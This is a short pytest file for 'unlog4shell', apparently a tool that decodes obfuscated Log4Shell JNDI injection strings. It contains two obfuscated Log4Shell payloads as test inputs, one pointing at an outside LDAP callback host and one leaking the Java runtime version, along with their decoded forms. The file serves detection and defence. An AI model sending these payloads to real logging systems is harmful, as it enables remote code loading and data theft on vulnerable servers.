import pytest

from unlog4shell import check_string


@pytest.mark.parametrize(
    "encoded, decoded",
    [
        ('${jNdi:${lower:L}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}',
         '${jndi:ldap://world80.log4j.binaryedge.io:80/callback}'),
    ]
)
def test_strings(encoded, decoded):
    assert check_string(encoded) == decoded


# Nasty example from https://github.com/woodpecker-appstore/log4j-payload-generator
def test_all_obfuscations():
    s = '${${nCdl:xlKziH:B:HfDmcQ:-j}${BYkus:XmUteQ:-n}${gN:NI:-d}${sLUUc:fh:eIw:-i}${XWAhx:gtd:-:}${sqf:-l}${tgyMAW:YoRmXr:LMC:QvG:-d}${B:DUPb:oSgUuo:xQz:gnYNX:-a}${YSJj:n:axeC:-p}${ylanor:VdRoFV:-:}${hu:eM:GKLG:XHOX:G:-/}${ks:PMA:LE:YUmi:LVrcMe:-/}${qVmdFK:-1}${GjiHeL:ERaPpC:CGNApg:-2}${MVU:-7}${IUEN:FM:G:Acq:-.}${WCYvc:-0}${dW:m:qtqMg:k:-.}${eS:-0}${qaTNqU:afnqb:RsE:P:Wag:-.}${Kqsld:-1}${Yh:-:}${Pd:vkyJfY:-1}${m:GO:-6}${twU:w:fMJFW:qb:JqSFP:-6}${mgUuFB:E:C:mJXbp:-4}${iVvv:cjOHtL:wo:IYkv:mMLV:-/}${${hWafTL:TR:GKneYS:-s}${LGL:Upqn:F:-y}${JOOU:LMQIPH:-s}${UYrvc:nv:0iQFc:G:-:}${LRaJh:zyD:-j}${G:a:po:if:-a}${yWTyt:Cbzj:eKui:-v}${f:yHA:k:-a}${tel:x:bki:-.}${bdE:DsswVr:-r}${iqoNvo:liis:-u}${VUSSL:nvFK:GqDir:-n}${x:eaYvi:J:FfAVgo:-t}${s:-i}${Wv:r:CH:-m}${RWIHGN:f:m:EBd:-e}${L:FxgFA:-.}${FFTDAY:GhA:-v}${LZKAHu:jkaEjK:fJ:-e}${pJoXcy:-r}${VVZS:VMDP:hBI:czXSu:JM:-s}${WFHCr:EyBTW:dHYnWi:FJA:-i}${o:LqDYN:EGYAGO:ApPu:JH:-o}${YLO:-n}}}'
    assert check_string(s) == '${jndi:ldap://127.0.0.1:1664/${sys:java.runtime.version}}'
